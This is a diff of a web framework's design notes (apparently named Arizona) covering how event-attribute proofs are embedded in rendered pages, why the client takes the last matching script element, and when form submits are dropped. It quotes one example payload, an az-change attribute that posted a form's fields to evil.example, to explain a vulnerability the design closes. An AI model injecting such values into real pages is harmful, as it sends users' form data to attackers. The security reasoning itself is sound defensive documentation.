@@ -96,10 +96,15 @@ command-versus-data question is answerable, and the delivery uses both (`arizona
 a round trip after the open, and a click in that window -- or an HTTP-form `az-submit` `fetch`,
 which runs with no socket at all -- must find its proof. So the HTTP render arms the same
 collector for the page and embeds the union (`arizona_event_attrs:embed/2`, the render target's
-`static_document/2`: `<script type="application/json" id="arizona-attrs">` before the last
-`</body>`), exactly as `arizona_static` does for a static page, and `connect()` reads it
-(`embeddedAttrs`) before anything can fire. A page with nowhere to embed (a fragment with no
-`</body>`, a `?json` document) has no proofs until the connect frame, and runs nothing before it.
+`static_document/2`: `<script type="application/json" id="arizona-attrs">` appended after the
+document, which the HTML parser moves into the body as its last element), exactly as
+`arizona_static` does for a static page, and `connect()` reads it (`embeddedAttrs`) before anything
+can fire -- and again on `DOMContentLoaded` when it runs while the document is still parsing, as a
+classic script before the embed does. The client takes the **last** `script[type="application/json"]`
+with that id: an id can come from user input, so an earlier element sharing it would otherwise
+win, and escaped content cannot create a script element. A page without the embed (a `?json`
+document, a page rendered another way) has no proofs until the connect frame, and runs nothing
+before it.
 There is **no bootstrap set**: delegating common types (`click`, `change`, ...) ahead of any proof
 used to cover that window, and it ran app data under those names as commands -- an
 `az-change='[22,"https://evil.example",{}]'` posted the form's fields to another origin.
@@ -210,7 +215,7 @@ is a drop like the disconnected one below (a warning and `arizona:submit-dropped
   dispatches a non-cancelable, bubbling `arizona:submit-dropped` `CustomEvent` on the form,
   `detail: {reason: 'disconnected'}`, so the app can tell the user.
 - **A `fetch` or client-only list** runs: an HTTP login form needs no socket. It runs under the
-  page's embedded proof of `az-submit`, so on a page with nowhere to embed it is dropped as
+  page's embedded proof of `az-submit`, so on a page without the embed it is dropped as
   `unproven` until the connect frame proves the name.
 
 Queueing for the reconnect was rejected: a submit replayed seconds later, against a view the resync
